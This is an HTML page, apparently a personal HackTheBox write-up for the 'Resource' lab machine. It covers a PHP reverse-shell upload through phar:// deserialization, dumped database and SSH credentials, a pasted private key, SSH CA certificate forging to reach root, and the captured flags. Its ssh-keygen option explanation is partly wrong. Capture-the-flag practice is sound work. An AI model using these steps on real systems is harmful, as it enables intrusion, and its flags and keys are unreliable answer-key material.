@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <title>HTB: Resource Seasonal Machine | v3l1d&#39;s Blog</title>
+
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta name="description" content="Port Scan
+┌──(kali㉿kali)-[~/HTB/Resource] └─$ cat scan_Complete # Nmap 7.94SVN scan initiated Sun Aug 11 14:52:16 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan_Complete 10.10.11.27 Nmap scan report for 10.10.11.27 Host is up (0.086s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2&#43;deb12u3 (protocol 2.0) | ssh-hostkey: | 256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA) |_ 256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519) 2222/tcp open ssh OpenSSH 8.">
+<meta name="generator" content="Hugo 0.92.2" />
+
+
+  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+
+
+
+
+
+
+
+
+  </head>
+
+  <body>
+    <nav class="navigation">
+	
+		<a href="/"> <span class="arrow">←</span>Home</a>
+	
+	<a href="/posts">Archive</a>
+	<a href="/tags">Tags</a>
+	<a href="/about">About</a>
+
+	
+
+	
+</nav>
+
+
+    <main class="main">
+      
+
+<section id="single">
+    <h1 class="title">HTB: Resource Seasonal Machine</h1>
+
+    <div class="tip">
+        <time datetime="2024-08-20 00:00:00 &#43;0000 UTC">Aug 20, 2024</time>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          772 words
+        </span>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          4 minute read
+        </span>
+    </div>
+
+    
+    
+
+
+    <div class="content">
+      <p><p class="markdown-image">
+  <img src="attachment/3bd70dd5104068e4031e06ac1c61711d.png" alt=""  />
+</p></p>
+<p><strong>Port Scan</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">┌──(kali㉿kali)-[~/HTB/Resource]
+└─$ cat scan_Complete 
+# Nmap 7.94SVN scan initiated Sun Aug 11 14:52:16 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan_Complete 10.10.11.27
+Nmap scan report for 10.10.11.27
+Host is up (0.086s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
+|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
+2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
+|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Aug 11 14:52:32 2024 -- 1 IP address (1 host up) scanned in 15.74 seconds
+</code></pre></div><p>Visit <a href="http://itrc.ssg.htb/" target="_blank" rel="noopener">http://itrc.ssg.htb/</a></p>
+<p><p class="markdown-image">
+  <img src="attachment/712ccf9b98e3eb82338f1bcde7b3513e.png" alt=""  />
+</p></p>
+<p>On this page you can open a ticket uploading a zip file containing a reverse shell script in php. You can exploit phar deserialization to handle the shell generated on revshell generator:</p>
+<p><p class="markdown-image">
+  <img src="attachment/f1f2f21551a2817bed9305cd5d124173.png" alt=""  />
+</p></p>
+<p><p class="markdown-image">
+  <img src="attachment/c85cade67bf78fd22ea7ffe4c4886d54.png" alt=""  />
+</p></p>
+<p>Upload the file on ticket system and open up its page:</p>
+<p><p class="markdown-image">
+  <img src="attachment/f50a4431998e612de3034ff616a90414.png" alt=""  />
+</p></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">http://itrc.ssg.htb/?page=phar://uploads/0d327960dcada2c40fb3b5c0cc99154b3963ecd4.zip/&lt;phpfilename&gt;
+without php extension
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cd /var/www
+$ ls
+html
+itrc
+$ cd itrc
+$ ls
+admin.php
+api
+assets
+create_ticket.php
+dashboard.php
+db.php
+filter.inc.php
+footer.inc.php
+header.inc.php
+home.php
+index.php
+loggedin.php
+login.php
+logout.php
+register.php
+savefile.inc.php
+ticket.php
+ticket_section.inc.php
+uploads
+$ cat db.php    
+&lt;?php
+$dsn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mysql:host=db;dbname=resourcecenter;&#34;</span>;
+$dbusername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jj&#34;</span>;
+$dbpassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ugEG5rR5SG8uPd&#34;</span>;
+$pdo <span style="color:#f92672">=</span> new PDO<span style="color:#f92672">(</span>$dsn, $dbusername, $dbpassword<span style="color:#f92672">)</span>;
+
+try <span style="color:#f92672">{</span>
+    $pdo-&gt;setAttribute<span style="color:#f92672">(</span>PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION<span style="color:#f92672">)</span>;
+<span style="color:#f92672">}</span> catch <span style="color:#f92672">(</span>PDOException $e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+    die<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Connection failed: &#34;</span> . $e-&gt;getMessage<span style="color:#f92672">())</span>;
+<span style="color:#f92672">}</span>$ 
+
+</code></pre></div><p>Credentials found here didn&rsquo;t work neither for ssh or others.
+This box looks always broken so i decided to look a writeup and found out that should be present a file in /uploads folder of itrc that i don&rsquo;t have:</p>
+<p><p class="markdown-image">
+  <img src="attachment/836cab1aee6922d645e447bf11a51d46.png" alt=""  />
+</p></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Credentials:
+msainristil:82yards2closeit
+</code></pre></div><p><p class="markdown-image">
+  <img src="attachment/334f5c9284c02ea18b054c4959331e94.png" alt=""  />
+</p></p>
+<p>In the decommisions_old_ca folder there is priv/pub key pair, that we are going to convert into ssh keys.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ssh-keygen -t rsa -b 2048 -f keypair
+ssh-keygen -s ca-itrc -n zzinter -I kali keypair.pub 
+</code></pre></div><p><p class="markdown-image">
+  <img src="attachment/865cfe3a7e89dbf3d5425f2b30dc78e3.png" alt=""  />
+</p></p>
+<p>When i was www-data i noted that was a port listening on 127.0.0.11, this usuaylly means that we are in adocker container, so trough linpeas i  had a tip about this. Then i used deepce and got:</p>
+<p><p class="markdown-image">
+  <img src="attachment/c3bd47cec612c42278a478ca983b2cd1.png" alt=""  />
+</p></p>
+<p>RABBIT HOLE, try hard on SSH: <a href="https://shivamaharjan.medium.com/ssh-cas-and-principals-630a433d76d6" target="_blank" rel="noopener">https://shivamaharjan.medium.com/ssh-cas-and-principals-630a433d76d6</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ssh-keygen -t ecdsa -C &#34;The CA&#34; -N &#34;&#34; -f root_key
+ssh-keygen -s ./ca-itrc -I CA-signing -n msainristil,zzinter,root -V +1w -z 1 ./root_key.pub
+
+Copy with scp generated files and:
+
+──(kali㉿kali)-[~/HTB/Resource]
+└─$ ssh -o CertificateFile=root_key-cert.pub -i root_key root@10.10.11.27            
+Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@itrc:~# ls
+</code></pre></div><p>Even if we logged as root, there&rsquo;s no root flag, so download <strong>sign_key_api.sh</strong> file.</p>
+<p><p class="markdown-image">
+  <img src="attachment/922daa0e3bdaddd8a0a3093c42c89b9f.png" alt=""  />
+</p></p>
+<p><p class="markdown-image">
+  <img src="attachment/09598aa1ce18ac9b5f233eecf3a06a09.png" alt=""  />
+</p></p>
+<p>From zzinter ssh scp this file: <strong>sign_key_api.sh</strong> and modify the file with vim appending <strong>zzinter_temp</strong> and <strong>root_user</strong> as are present in ssh_principals of the box. This is visible generating a public cert for support@ssg.</p>
+<p><p class="markdown-image">
+  <img src="attachment/f1ae315604077afbaba6cfce52ee1e7c.png" alt=""  />
+</p></p>
+<p>Now sign the private key we obtained with the script, generating a certificate signed</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">┌──(kali㉿kali)-[~/HTB/Resource/zzinter_keys]
+└─$ ./sign_key_api.sh keypair.pub zzinter zzinter_temp &gt; zzinter.cert
+</code></pre></div><p>From a writeup (i needed help) i recover this key that we will use a certificate to generate root ssh-key. Pasted it in root_ssh.cert file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW 
+QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc 
+rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ 
+AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA 
+cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV 
+QBAgM=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div><p>Then login as root on your kali and sign a the private key using this certificate i provided</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">┌──(root㉿kali)-[/home/kali/HTB/Resource/zzinter_keys]
+└─# ssh-keygen -s root_ssh.cert -z 1 -I root -V -1W:forever -n root_user keypair.pub
+Signed user key keypair-cert.pub: id &#34;root&#34; serial 1 for root_user valid after 2024-08-13T13:24:56
+┌──(root㉿kali)-[/home/kali/HTB/Resource/zzinter_keys]
+└─# ssh-keygen -f keypair-cert.pub -e &gt; root_keypair
+┌──(root㉿kali)-[/home/kali/HTB/Resource/zzinter_keys]
+└─# ssh -o CertificateFile=keypair-cert.pub -i keypair root@10.10.11.27 -p 2222
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ssh-keygen -s root_ssh.cert -z 1 -I root -V -1W:forever -n root_user keypair //Extract the pub key from private // OR
+ssh-keygen -s root_ssh.cert -z 1 -I root -V -1W:forever -n root_user keypair.pub //Use Directly the pub key
+</code></pre></div><p>This command generates a signed SSH user certificate using the <code>ssh-keygen</code> tool. Here&rsquo;s what each option does:</p>
+<ul>
+<li>-s root_ssh.cert`: specifies the CA certificate file to use for signing (not shown in the output, but assumed to exist).</li>
+<li>-z 1`: specifies the serial number of the certificate (in this case, 1).</li>
+<li><code>-I root</code>: specifies the principal identity of the certificate (in this case, &ldquo;root&rdquo;).</li>
+<li><code>-V -1W:forever</code>: specifies the validity period of the certificate (in this case, forever, starting from the current time).</li>
+<li><code>-n root_user</code>: specifies the username of the certificate (in this case, &ldquo;root_user&rdquo;).</li>
+<li><code>keypair.pub</code>: specifies the output file for the generated public key.</li>
+</ul>
+<p>The resulting certificate is stored in <code>keypair-cert.pub</code>.</p>
+<p><strong>Flags</strong></p>
+<p><p class="markdown-image">
+  <img src="attachment/d9314cee50c28c2118e10e586b1ea6b8.png" alt=""  />
+</p></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">user: 98a79086fe46218a7edd6abc87eb54f3
+root: 495f767f17cf87214179384c1f145b91
+</code></pre></div>
+    </div>
+
+    
+    
+    
+  <div id="comment">
+    
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "your-disqus-shortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </div>
+
+
+</section>
+
+
+    </main>
+    
+    <footer id="footer">
+    
+        <div id="social">
+
+
+    <a class="symbol" href="https://github.com/v3l1d" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>Github</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
+            <g id="Github" transform="translate(264.000000, 939.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+
+</div>
+
+    
+
+    <div class="copyright">
+    
+        ❤️ v3l1d
+    
+    </div>
+
+    
+      <div class="powerby">
+        Powered by <a href='http://www.gohugo.io/'>Hugo</a> Theme By <a href='https://github.com/nodejh/hugo-theme-mini'>nodejh</a>
+      </div>
+    
+</footer>
+
+
+
+  </body>
+</html>
